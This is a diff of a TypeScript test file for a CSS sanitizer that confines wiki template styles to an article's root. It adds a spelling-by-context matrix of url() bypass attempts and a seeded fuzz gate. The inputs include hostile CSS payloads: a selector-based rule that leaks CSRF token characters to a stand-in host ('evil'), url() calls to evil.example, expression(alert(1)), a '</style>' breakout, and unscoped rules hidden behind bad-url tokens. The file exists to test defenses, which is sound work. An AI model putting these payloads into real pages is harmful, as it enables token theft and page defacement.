@@ -3,11 +3,18 @@
 // lightningcss (a spec CSS tokenizer and parser, like the browsers'), run over what the scoper emits: every rule
 // it finds must be confined to the article's root, and no at-rule but @media may be left. lightningcss is
 // a devDependency pinned to the version tailwind already resolves; postcss walks its output.
+//
+// Folds scope-template-styles-matrix (every spelling of `url(` against every ambiguous body in every place a url can
+// sit) and scope-template-styles-oracle (the exact-oracle fuzz gate: seeded generators make 20,000 hostile sheets
+// each; whatever the scoper keeps, lightningcss and the @csstools tokenizer must find nothing out of bounds, and
+// scoping again must change nothing). For a deep run: `bun run audit:template-styles`.
 import { TIMING_BUDGET_SCALE } from "~/tests/helpers/timing-budget";
 import { transform } from "lightningcss";
 import postcss from "postcss";
 import { ARTICLE_STYLE_SCOPE, scopeTemplateStyles } from "~/lib/utils/scope-template-styles";
 import { violations, OWN_ORIGIN } from "../../../scripts/lib/template-styles-oracle";
+import { GENERATORS, runGenerator } from "../../../scripts/lib/template-styles-fuzz";
+import { tokenViolations } from "../../../scripts/lib/template-styles-oracle-tokens";
 import {
   sanitizeHtml,
   sanitizeUserContent,
@@ -30,7 +37,8 @@ function browserView(css: string): BrowserView {
   const root = postcss.parse(code.toString());
   const view: BrowserView = { selectors: [], atRules: [] };
   root.walk((node) => {
-    if (node.type === "rule") view.selectors.push(...node.selectors.map((selector) => selector.trim()));
+    if (node.type === "rule")
+      view.selectors.push(...node.selectors.map((selector) => selector.trim()));
     else if (node.type === "atrule" && node.name !== "media") view.atRules.push(node.name);
   });
   return view;
@@ -43,12 +51,24 @@ const confined = (selector: string): boolean =>
 
 describe("a bad-url token hides nothing from the scoper (CSS Syntax 4.3.6)", () => {
   it.each([
-    ["a quote inside an unquoted url()", `.a{background:url(x"y);}body{display:none}.b{background:url(x"y)}`],
+    [
+      "a quote inside an unquoted url()",
+      `.a{background:url(x"y);}body{display:none}.b{background:url(x"y)}`,
+    ],
     ["the same behind a comment", `.a{background:url(x"y);}body{display:none}/*"*/)}`],
     ["a single quote", `.a{background:url(x'y);}body{display:none}.b{background:url(x'y)}`],
-    ["an escaped function name", `.a{background:\\75 rl(x"y);}body{display:none}.b{background:url(x"y)}`],
-    ["an upper-case function name", `.a{background:URL(x"y);}body{display:none}.b{background:url(x"y)}`],
-    ["a url inside a selector", `.a:is(url(x"y)){color:red}body{display:none}.b:is(url(x"y)){color:red}`],
+    [
+      "an escaped function name",
+      `.a{background:\\75 rl(x"y);}body{display:none}.b{background:url(x"y)}`,
+    ],
+    [
+      "an upper-case function name",
+      `.a{background:URL(x"y);}body{display:none}.b{background:url(x"y)}`,
+    ],
+    [
+      "a url inside a selector",
+      `.a:is(url(x"y)){color:red}body{display:none}.b:is(url(x"y)){color:red}`,
+    ],
     [
       "a smuggled exfiltration rule",
       `.a{background:url(x"y);}input[name=csrf][value^=a]{background:url(https://evil/a)}.b{background:url(x"y)}`,
@@ -82,7 +102,7 @@ describe("a bad-url token hides nothing from the scoper (CSS Syntax 4.3.6)", () 
     '.a{background:url("x y.png")}',
     ".a{background:url( 'x\"y.png' )}",
     ".a{background:url(a\\29 b.png)}",
-    ".a{background:url(a\\\"b.png)}",
+    '.a{background:url(a\\"b.png)}',
     ".a{background:url(data-x.png)}",
     '.a{background:foo(x"y")}',
     '.a{background:xurl(x"y")}',
@@ -120,8 +140,12 @@ describe("a sibling combinator on the root does not reach outside the article", 
   it("keeps the siblings of an element inside the article, and a child or descendant of the root", () => {
     expect(scopeTemplateStyles(`${S} .a ~ .b{color:red}`)).toBe(`${S} .a ~ .b{color:red}`);
     expect(scopeTemplateStyles(`${S} > .a + .b{color:red}`)).toBe(`${S} > .a + .b{color:red}`);
-    expect(scopeTemplateStyles(`${S}.wide .a ~ .b{color:red}`)).toBe(`${S}.wide .a ~ .b{color:red}`);
-    expect(scopeTemplateStyles(".a ~ .b, .c + .d{color:red}")).toBe(`${S} .a ~ .b,${S} .c + .d{color:red}`);
+    expect(scopeTemplateStyles(`${S}.wide .a ~ .b{color:red}`)).toBe(
+      `${S}.wide .a ~ .b{color:red}`
+    );
+    expect(scopeTemplateStyles(".a ~ .b, .c + .d{color:red}")).toBe(
+      `${S} .a ~ .b,${S} .c + .d{color:red}`
+    );
   });
 
   it("a class that merely starts with the root's name is not the root (its escape is part of the identifier)", () => {
@@ -163,11 +187,17 @@ describe("a hostile declaration costs time linear in its size", () => {
   };
 
   it.each([
-    ["22,000 escaped `url(` names and no real paren", ".a{background:" + "u\\72l\\28 ".repeat(22_000) + "}"],
+    [
+      "22,000 escaped `url(` names and no real paren",
+      ".a{background:" + "u\\72l\\28 ".repeat(22_000) + "}",
+    ],
     ["20,000 url( that never close", ".a{background:" + "url(".repeat(20_000) + "}"],
     ["20,000 url( that close once, at the end", ".a{background:" + "url(a".repeat(20_000) + ")}"],
     ["20,000 closed urls", ".a{background:" + "url(a) ".repeat(20_000) + "}"],
-    ["20,000 url followed by spaces and no paren", ".a{background:" + "url   ".repeat(20_000) + "}"],
+    [
+      "20,000 url followed by spaces and no paren",
+      ".a{background:" + "url   ".repeat(20_000) + "}",
+    ],
   ])("%s", (_name, css) => {
     expect(timed(css)).toBeLessThan(1_000); // ~150 ms here; a quadratic reader takes tens of seconds
   });
@@ -275,13 +305,19 @@ describe("the url() allowlist judges the target a browser fetches, not a truncat
     "https://ixwiki.com:8443/a",
   ])("drops %s, quoted either way and bare", (target) => {
     for (const quote of ['"', "'", ""]) {
-      expect(scopeTemplateStyles(`.a{background:url(${quote}${target}${quote})}`, OWN_ORIGIN)).toBe("");
+      expect(scopeTemplateStyles(`.a{background:url(${quote}${target}${quote})}`, OWN_ORIGIN)).toBe(
+        ""
+      );
     }
   });
 
   it("refuses a declaration whose url( it cannot read as a url (an escaped name, a string then more tokens)", () => {
-    expect(scopeTemplateStyles(`.a{background:u\\72l(a.png);color:red}`, OWN_ORIGIN)).toBe(`${S} .a{color:red}`);
-    expect(scopeTemplateStyles(`.a{background:url("a.png" b);color:red}`, OWN_ORIGIN)).toBe(`${S} .a{color:red}`);
+    expect(scopeTemplateStyles(`.a{background:u\\72l(a.png);color:red}`, OWN_ORIGIN)).toBe(
+      `${S} .a{color:red}`
+    );
+    expect(scopeTemplateStyles(`.a{background:url("a.png" b);color:red}`, OWN_ORIGIN)).toBe(
+      `${S} .a{color:red}`
+    );
     expect(scopeTemplateStyles(`.a{background:url(a.png)url(b.png);color:red}`, OWN_ORIGIN)).toBe(
       `${S} .a{background:url(a.png)url(b.png);color:red}`
     );
@@ -315,18 +351,148 @@ describe("a real url() hidden behind a fake one inside a string, or spelled with
   });
 
   it("keeps what is only a string, a longer name or a plain url", () => {
-    expect(scopeTemplateStyles(`.a{content:"url(a)"}`, OWN_ORIGIN)).toBe(`${S} .a{content:"url(a)"}`);
-    expect(scopeTemplateStyles(`.a{content:"url(" "\\78 url(a)" ")"}`, OWN_ORIGIN)).toContain(`"\\78 url(a)"`);
-    expect(scopeTemplateStyles(`.a{background:url(a.png)}`, OWN_ORIGIN)).toBe(`${S} .a{background:url(a.png)}`);
-    expect(scopeTemplateStyles(`.a{background:url("https://ixwiki.com/a.png")}`, OWN_ORIGIN)).toContain("https://ixwiki.com/a.png");
+    expect(scopeTemplateStyles(`.a{content:"url(a)"}`, OWN_ORIGIN)).toBe(
+      `${S} .a{content:"url(a)"}`
+    );
+    expect(scopeTemplateStyles(`.a{content:"url(" "\\78 url(a)" ")"}`, OWN_ORIGIN)).toContain(
+      `"\\78 url(a)"`
+    );
+    expect(scopeTemplateStyles(`.a{background:url(a.png)}`, OWN_ORIGIN)).toBe(
+      `${S} .a{background:url(a.png)}`
+    );
+    expect(
+      scopeTemplateStyles(`.a{background:url("https://ixwiki.com/a.png")}`, OWN_ORIGIN)
+    ).toContain("https://ixwiki.com/a.png");
     // `xurl(` and `-url(` are other functions; `\\78 url(` is `xurl(` too
-    expect(scopeTemplateStyles(`.a{background:xurl(https://evil.example/x) -url(a)}`, OWN_ORIGIN)).toContain("xurl(");
+    expect(
+      scopeTemplateStyles(`.a{background:xurl(https://evil.example/x) -url(a)}`, OWN_ORIGIN)
+    ).toContain("xurl(");
     expect(scopeTemplateStyles(`.a{background:\\78 url(a)}`, OWN_ORIGIN)).toContain("\\78 url(a)");
   });
 
   it("judges a real url after a string, in every position of the value", () => {
     expect(scopeTemplateStyles(`.a{content:"x" url(https://evil.example/x)}`, OWN_ORIGIN)).toBe("");
-    expect(scopeTemplateStyles(`.a{content:foo(url(https://evil.example/x))}`, OWN_ORIGIN)).toBe("");
-    expect(scopeTemplateStyles(`.a{content:"x" url(a.png) "y" url(https://ixwiki.com/b.png)}`, OWN_ORIGIN)).toContain("b.png");
+    expect(scopeTemplateStyles(`.a{content:foo(url(https://evil.example/x))}`, OWN_ORIGIN)).toBe(
+      ""
+    );
+    expect(
+      scopeTemplateStyles(
+        `.a{content:"x" url(a.png) "y" url(https://ixwiki.com/b.png)}`,
+        OWN_ORIGIN
+      )
+    ).toContain("b.png");
+  });
+});
+
+describe("url( spellings x bodies x contexts (plan 415 re-review B1b)", () => {
+  /** Seven spellings of the function name `url(`. */
+  const NAMES = ["url(", "URL(", "UrL(", "\\75 rl(", "u\\72l(", "\\000075rl(", "\\75\\72\\6c("];
+  /** Twenty-nine arguments, each a way the url's text and its quoting can be read two ways. */
+  const BODIES = [
+    `x"y`,
+    `x'y`,
+    `x(y`,
+    `x y`,
+    `x\ty`,
+    `x\ny`,
+    `x\fy`,
+    `x\u0003y`,
+    `x\u000by`,
+    `x\u007fy`,
+    `x\\\ny`,
+    `x\\`,
+    `a/*)*/"y`,
+    `a/*)*/'y`,
+    `a/*)*/ "y`,
+    `a/*(*/ "y`,
+    `/*)*/a "y`,
+    `a/**/"y`,
+    `/**/"y`,
+    `a/*"*/b`,
+    `a/*;}body{display:none}*/b`,
+    `a\\29 "y`,
+    `a\\)"y`,
+    `a\\\\)"y`,
+    `"y`,
+    ` "y`,
+    `\n"y`,
+    `a)"y`,
+    `a))"y`,
+  ];
+  /** Eight places a url can sit, each followed by an unscoped rule a lexer fooled about the structure would keep. */
+  const CONTEXTS: ReadonlyArray<(fn: string) => string> = [
+    (f) => `.a{background:${f};}body{display:none}.b{background:${f}}`,
+    (f) => `.a{background:${f}}body{display:none}.b{background:${f}}`,
+    (f) => `.a:is(${f}){color:red}body{display:none}.b:is(${f}){color:red}`,
+    (f) => `@media screen{.a{background:${f};}}body{display:none}.b{background:${f}}`,
+    (f) => `${f}{color:red}body{display:none}${f}{color:red}`,
+    (f) => `.a{background:${f};}body{display:none}`,
+    (f) => `.a{background:${f};}body{display:none}/*"*/ )}`,
+    (f) => `.a{background:${f};}body{display:none}/*'*/ )}`,
+  ];
+
+  it("lets nothing out of bounds through: 7 x 29 x 8 = 1624 sheets, 0 bypasses", () => {
+    const sheets = NAMES.flatMap((name) =>
+      BODIES.flatMap((body) => CONTEXTS.map((context) => context(`${name}${body})`)))
+    );
+    const bypasses = sheets.flatMap((css) => {
+      const found = violations(scopeTemplateStyles(css, OWN_ORIGIN));
+      return found.length > 0 ? [`${JSON.stringify(css)} => ${found[0]}`] : [];
+    });
+    expect(sheets).toHaveLength(1624);
+    expect(bypasses).toEqual([]);
+  });
+});
+
+describe("the exact-oracle fuzz gate", () => {
+  const ITERATIONS = 20_000;
+  /** A generator whose sheets all came out empty would pass for nothing: at least this many must survive to be judged. */
+  const MIN_JUDGED = 200;
+
+  it.each(Object.keys(GENERATORS))(
+    `generator %s: ${ITERATIONS} sheets, 0 violations in either oracle, 0 non-idempotent outputs`,
+    (name) => {
+      const report = runGenerator(name, ITERATIONS);
+      expect(report.samples).toEqual([]);
+      expect(report.violationCount).toBe(0);
+      expect(report.tokenViolationCount).toBe(0);
+      expect(report.nonIdempotentCount).toBe(0);
+      expect(report.ran).toBe(ITERATIONS);
+      expect(report.nonEmpty).toBeGreaterThanOrEqual(MIN_JUDGED);
+    }
+  );
+
+  // A gate that cannot fail is no gate: each oracle must flag the shapes it exists to catch, and pass a clean sheet.
+  describe.each([
+    ["lightningcss", violations],
+    ["token", tokenViolations],
+  ] as const)("the %s oracle", (_name, judge) => {
+    it.each([
+      [".mw-parser-output:hover > p, .mw-parser-output .b{color:red}"],
+      ["@media screen{.mw-parser-output .a{background:url(https://ixwiki.com/x)}}"],
+      [".mw-parser-output .a{background:url(/x.png);content:'url(' \"url(a)\"}"],
+    ])("passes %s", (css) => {
+      expect(judge(css)).toEqual([]);
+    });
+
+    it.each([
+      ["a sibling of the root", ".mw-parser-output ~ x{color:red}"],
+      [
+        "an unscoped rule behind a bad url",
+        '.mw-parser-output .a{background:url(x"y);}body{display:none}',
+      ],
+      ["an escaped root followed by a sibling combinator", ".mw-parser-output\\ ~ x{color:red}"],
+      ["a sibling combinator with no whitespace", ".mw-parser-output+x{color:red}"],
+      ["a nested rule", ".mw-parser-output .a{color:red;.b{color:blue}}"],
+      ["expression()", ".mw-parser-output .a{width:expression(alert(1))}"],
+      ["@font-face", "@font-face{src:url(a)}"],
+      ["an unscoped rule inside @media", "@media screen{body{color:red}}"],
+      ["a protocol-relative url", ".mw-parser-output .a{background:url(//evil.example/x)}"],
+      ["attr()", ".mw-parser-output .a{content:attr(data-src url)}"],
+      ["image-set()", '.mw-parser-output .a{background:image-set("a.png" 1x)}'],
+      ["a `<`", '.mw-parser-output .a{content:"</style>"}'],
+    ])("flags %s", (_what, css) => {
+      expect(judge(css)).not.toEqual([]);
+    });
   });
 });
